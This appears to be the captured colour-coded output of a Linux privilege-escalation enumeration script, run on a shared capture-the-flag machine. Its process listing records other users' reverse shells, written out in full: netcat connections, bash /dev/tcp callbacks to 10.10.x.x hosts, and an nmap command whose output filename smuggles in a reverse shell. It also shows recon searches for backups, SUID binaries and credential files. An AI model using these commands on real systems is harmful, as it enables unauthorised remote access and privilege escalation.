+[97m[[91m![97m] [90msof000[97m Can we connect to MySQL with root/root credentials?[90m.............[90m nope[0;0m
+[97m[[91m![97m] [90msof010[97m Can we connect to MySQL as root without password?[90m...............[90m nope[0;0m
+[97m[[91m![97m] [90msof015[97m Are there credentials in mysql_history file?[90m....................[90m nope[0;0m
+[97m[[91m![97m] [90msof020[97m Can we connect to PostgreSQL template0 as postgres and no pass?[90m.[90m nope[0;0m
+[97m[[91m![97m] [90msof020[97m Can we connect to PostgreSQL template1 as postgres and no pass?[90m.[90m nope[0;0m
+[97m[[91m![97m] [90msof020[97m Can we connect to PostgreSQL template0 as psql and no pass?[90m.....[90m nope[0;0m
+[97m[[91m![97m] [90msof020[97m Can we connect to PostgreSQL template1 as psql and no pass?[90m.....[90m nope[0;0m
+[97m[[93m*[97m] [90msof030[97m Installed apache modules[90m........................................[90m nope[0;0m
+[97m[[91m![97m] [90msof040[97m Found any .htpasswd files?[90m......................................[90m nope[0;0m
+[97m[[91m![97m] [90msof050[97m Are there private keys in ssh-agent?[90m............................[90m nope[0;0m
+[97m[[91m![97m] [90msof060[97m Are there gpg keys cached in gpg-agent?[90m.........................[90m nope[0;0m
+[97m[[91m![97m] [90msof070[97m Can we write to a ssh-agent socket?[90m.............................[90m nope[0;0m
+[97m[[91m![97m] [90msof080[97m Can we write to a gpg-agent socket?[90m.............................[92m yes![0;0m
+[90m---[0;0m
+/run/user/1000/gnupg/S.gpg-agent
+/run/user/1000/gnupg/S.gpg-agent.ssh
+/run/user/1000/gnupg/S.gpg-agent.extra
+/run/user/1000/gnupg/S.gpg-agent.browser
+[90m---[0;0m
+[97m[[94mi[97m] [90msof500[97m Sudo version[90m.................................................... [90mskip
+[97m[[94mi[97m] [90msof510[97m MySQL version[90m................................................... [90mskip
+[97m[[94mi[97m] [90msof520[97m Postgres version[90m................................................ [90mskip
+[97m[[94mi[97m] [90msof530[97m Apache version[90m.................................................. [90mskip
+[35m=============================================================([32m containers [35m)=====[0;0m
+[97m[[93m*[97m] [90mctn000[97m Are we in a docker container?[90m...................................[90m nope[0;0m
+[97m[[93m*[97m] [90mctn010[97m Is docker available?[90m............................................[90m nope[0;0m
+[97m[[91m![97m] [90mctn020[97m Is the user a member of the 'docker' group?[90m.....................[90m nope[0;0m
+[97m[[93m*[97m] [90mctn200[97m Are we in a lxc container?[90m......................................[90m nope[0;0m
+[97m[[91m![97m] [90mctn210[97m Is the user a member of any lxc/lxd group?[90m......................[90m nope[0;0m
+[35m==============================================================([32m processes [35m)=====[0;0m
+[97m[[94mi[97m] [90mpro000[97m Waiting for the process monitor to finish[90m.......................[34m yes![0;0m
+[97m[[94mi[97m] [90mpro001[97m Retrieving process binaries[90m.....................................[34m yes![0;0m
+[97m[[94mi[97m] [90mpro002[97m Retrieving process users[90m........................................[34m yes![0;0m
+[97m[[91m![97m] [90mpro010[97m Can we write in any process binary?[90m.............................[90m nope[0;0m
+[97m[[93m*[97m] [90mpro020[97m Processes running with root permissions[90m.........................[36m yes![0;0m
+[90m---[0;0m
+[32mSTART      PID     USER COMMAND
+[35m18:35 [0;0m  433175 [33m    root [0;0mruby /opt/metasploit-framework-6.0.9/msfconsole
+[35m18:35 [0;0m  433174 [33m    root [0;0msudo /opt/metasploit-framework-6.0.9/msfconsole
+[35m17:11 [0;0m     945 [33m    root [0;0m/usr/lib/policykit-1/polkitd --no-debug
+[35m17:11 [0;0m     932 [33m    root [0;0m/sbin/agetty -o -p -- \u --noclear tty1 linux
+[35m17:10 [0;0m     890 [33m    root [0;0m/lib/systemd/systemd-logind
+[35m17:10 [0;0m     884 [33m    root [0;0m/usr/lib/snapd/snapd
+[35m17:10 [0;0m     877 [33m    root [0;0m/usr/sbin/incrond
+[35m17:10 [0;0m     875 [33m    root [0;0m/usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+[35m17:10 [0;0m     873 [33m    root [0;0m/usr/sbin/irqbalance --foreground
+[35m17:10 [0;0m     859 [33m    root [0;0m/usr/sbin/cron -f
+[35m17:10 [0;0m     852 [33m    root [0;0m/usr/lib/accountsservice/accounts-daemon
+[35m17:10 [0;0m     733 [33m    root [0;0m/usr/bin/vmtoolsd
+[35m17:10 [0;0m     729 [33m    root [0;0m/usr/bin/VGAuthService
+[35m17:10 [0;0m     654 [33m    root [0;0m/sbin/multipathd -d -s
+[35m17:10 [0;0m     486 [33m    root [0;0m/lib/systemd/systemd-udevd
+[35m17:10 [0;0m     459 [33m    root [0;0m/lib/systemd/systemd-journald
+[35m17:10 [0;0m       1 [33m    root [0;0m/sbin/init maybe-ubiquity
+[90m---[0;0m
+[97m[[93m*[97m] [90mpro030[97m Processes running by non-root users with shell[90m..................[36m yes![0;0m
+[90m---[0;0m
+
+
+------ kid ------
+
+
+[32mSTART      PID     USER COMMAND
+[31m18:52 [0;0m  451786 [33m     kid [31msleep 1
+[35m18:52 [0;0m  451688 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  451591 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  451494 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  451404 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  451305 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  451205 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  451108 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  451007 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  450910 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  450819 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  450734 [33m     kid [0;0mnano exploit.py
+[35m18:52 [0;0m  450723 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  450621 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  450523 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  450423 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  450348 [33m     kid [0;0msleep 1
+[31m18:52 [0;0m  450337 [33m     kid [31mpython3 exploit.py
+[35m18:52 [0;0m  450265 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  450199 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  450105 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  450010 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  449915 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  449813 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  449721 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  449623 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  449525 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  449432 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  449324 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  449235 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  449141 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  449043 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  448945 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  448848 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  448751 [33m     kid [0;0msleep 1
+[35m18:52 [0;0m  448750 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[35m18:52 [0;0m  448637 [33m     kid [0;0mfind / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -name *dockerenv* -exec ls -la {} ;
+[35m18:52 [0;0m  448635 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[31m18:52 [0;0m  448579 [33m     kid [31m/bin/sh ./lse.sh -l1
+[31m18:52 [0;0m  448528 [33m     kid [31m/bin/sh ./lse.sh -l1
+[35m18:52 [0;0m  448440 [33m     kid [0;0mfind / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -name *.htpasswd -print -exec cat {} ;
+[35m18:52 [0;0m  448439 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[31m18:52 [0;0m  448340 [33m     kid [31msleep 0.2
+[31m18:52 [0;0m  448338 [33m     kid [31mgrep -i listening on lo
+[31m18:52 [0;0m  448337 [33m     kid [31m/bin/sh ./lse.sh -l1
+[31m18:52 [0;0m  448335 [33m     kid [31m/bin/sh ./lse.sh -l1
+[31m18:52 [0;0m  448264 [33m     kid [31m/bin/sh ./lse.sh -l1
+[35m18:52 [0;0m  448003 [33m     kid [0;0mgetcap -r /
+[35m18:52 [0;0m  448002 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[31m18:52 [0;0m  447947 [33m     kid [31mgrep -v root
+[31m18:52 [0;0m  447946 [33m     kid [31m/bin/sh ./lse.sh -l1
+[31m18:52 [0;0m  447945 [33m     kid [31m/bin/sh ./lse.sh -l1
+[35m18:52 [0;0m  447797 [33m     kid [0;0mfind / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -path /usr/lib -prune -o -path /usr/share -prune -o -regextype egrep -iregex .*(backup|dump|cop(y|ies)|bak|bkp)[^/]*\.(sql|tgz|tar|zip)?\.?(gz|xz|bzip2|bz2|lz|7z)? -readable -type f -exec ls -al {} ;
+[35m18:52 [0;0m  447796 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[31m18:52 [0;0m  447772 [33m     kid [31m/bin/sh ./lse.sh -l1
+[35m18:52 [0;0m  447717 [33m     kid [0;0mnano exploit.py
+[35m18:52 [0;0m  447660 [33m     kid [0;0mfind / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o ( -name .git -o -name .svn ) -print
+[35m18:52 [0;0m  447659 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[31m18:52 [0;0m  447601 [33m     kid [31m/bin/sh ./lse.sh -l1
+[31m18:52 [0;0m  447514 [33m     kid [31m/bin/sh ./lse.sh -l1
+[35m18:52 [0;0m  447261 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[35m18:51 [0;0m  447128 [33m     kid [0;0mfind / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -perm -4000 -type f -print
+[35m18:51 [0;0m  447127 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[35m18:51 [0;0m  447016 [33m     kid [0;0mfind / -path /home/kid -prune -o -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type l -user kid -print
+[31m18:51 [0;0m  446932 [33m     kid [31msleep 0.001
+[35m18:51 [0;0m  446857 [33m     kid [0;0mfind / -path /home/kid -prune -o -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -not -type l -writable -print
+[35m18:51 [0;0m  446856 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[31m18:51 [0;0m  446814 [33m     kid [31msort -u
+[31m18:51 [0;0m  446813 [33m     kid [31mtr : 
+[31m18:51 [0;0m  446812 [33m     kid [31mcut -d= -f2
+[31m18:51 [0;0m  446811 [33m     kid [31mtr -d "'
+[31m18:51 [0;0m  446810 [33m     kid [31mgrep -ERh ^ *PATH=.* /etc/
+[31m18:51 [0;0m  446809 [33m     kid [31m/bin/sh ./lse.sh -l1
+[31m18:51 [0;0m  446807 [33m     kid [31m/bin/sh ./lse.sh -l1
+[35m18:51 [0;0m  446779 [33m     kid [0;0msed s/^ *//g
+[35m18:51 [0;0m  446778 [33m     kid [0;0muniq -c
+[35m18:51 [0;0m  446777 [33m     kid [0;0msort -Mr
+[35m18:51 [0;0m  446775 [33m     kid [0;0mgrep -v ^START
+[35m18:51 [0;0m  446773 [33m     kid [0;0msed s/^ *//g
+[35m18:51 [0;0m  446771 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[35m18:51 [0;0m  446770 [33m     kid [0;0msleep 60
+[35m18:51 [0;0m  446768 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[35m18:51 [0;0m  446767 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[35m18:51 [0;0m  446561 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[35m18:51 [0;0m  443902 [33m     kid [0;0mbash -i
+[35m18:51 [0;0m  443901 [33m     kid [0;0m/bin/bash rev.sh
+[35m18:51 [0;0m  442015 [33m     kid [0;0msed s/^ *//g
+[35m18:51 [0;0m  442014 [33m     kid [0;0muniq -c
+[35m18:51 [0;0m  442013 [33m     kid [0;0msort -Mr
+[35m18:51 [0;0m  442010 [33m     kid [0;0mgrep -v ^START
+[35m18:51 [0;0m  442009 [33m     kid [0;0msleep 60
+[35m18:51 [0;0m  442007 [33m     kid [0;0msed s/^ *//g
+[35m18:51 [0;0m  442004 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[35m18:51 [0;0m  442003 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[35m18:51 [0;0m  442002 [33m     kid [0;0m/bin/sh ./lse.sh -l1
+[35m18:43 [0;0m  441730 [33m     kid [0;0m/bin/sh
+[35m18:43 [0;0m  441729 [33m     kid [0;0mnc 10.10.14.188 7564
+[35m18:31 [0;0m  432680 [33m     kid [0;0m/bin/bash
+[35m18:31 [0;0m  432679 [33m     kid [0;0mpython3 -c import pty;pty.spawn("/bin/bash")
+[35m18:31 [0;0m  432529 [33m     kid [0;0m/bin/sh
+[35m18:31 [0;0m  432528 [33m     kid [0;0mnc 10.10.14.242 4444
+[35m18:30 [0;0m  432336 [33m     kid [0;0mvi hackers
+[35m18:05 [0;0m  353675 [33m     kid [0;0m/usr/bin/gpg-agent --supervised
+[35m18:05 [0;0m  353672 [33m     kid [0;0m/usr/bin/dirmngr --supervised --honor-http-proxy
+[35m18:05 [0;0m  353670 [33m     kid [0;0m/usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+[35m18:04 [0;0m  335001 [33m     kid [0;0m/bin/bash
+[35m18:04 [0;0m  335000 [33m     kid [0;0mpython3 -c import pty;pty.spawn("/bin/bash")
+[35m18:03 [0;0m  334768 [33m     kid [0;0m/bin/sh
+[35m17:14 [0;0m   31381 [33m     kid [0;0m-bash
+[35m17:14 [0;0m   31193 [33m     kid [0;0msshd: kid@pts/1
+[35m17:14 [0;0m   30839 [33m     kid [0;0m(sd-pam)
+[35m17:14 [0;0m   30831 [33m     kid [0;0m/lib/systemd/systemd --user
+[35m17:13 [0;0m   10773 [33m     kid [0;0m/bin/bash
+[35m17:13 [0;0m   10768 [33m     kid [0;0mpython3 -c import pty; pty.spawn("/bin/bash");
+[35m17:12 [0;0m    8514 [33m     kid [0;0m/bin/sh
+[35m17:12 [0;0m    8513 [33m     kid [0;0mnc 10.10.16.28 9001
+[35m17:10 [0;0m     863 [33m     kid [0;0m/usr/bin/python3 /home/kid/html/app.py
+
+
+------ pwn ------
+
+
+[32mSTART      PID     USER COMMAND
+[35m18:32 [0;0m  432794 [33m     pwn [0;0mbash -i
+[35m18:32 [0;0m  432793 [33m     pwn [0;0m/bin/bash -c bash -i >& /dev/tcp/10.10.14.242/9001 0>&1
+[35m18:32 [0;0m  432788 [33m     pwn [0;0msh -c nmap --top-ports 10 -oN recon/;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.242/9001 0>&1' #.nmap ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.242/9001 0>&1' # 2>&1 >/dev/null
+[90m---[0;0m
+[97m[[94mi[97m] [90mpro500[97m Running processes[90m............................................... [90mskip
+[97m[[94mi[97m] [90mpro510[97m Running process binaries and permissions[90m........................ [90mskip
+
+[35m==================================([32m FINISHED [35m)==================================[0;0m
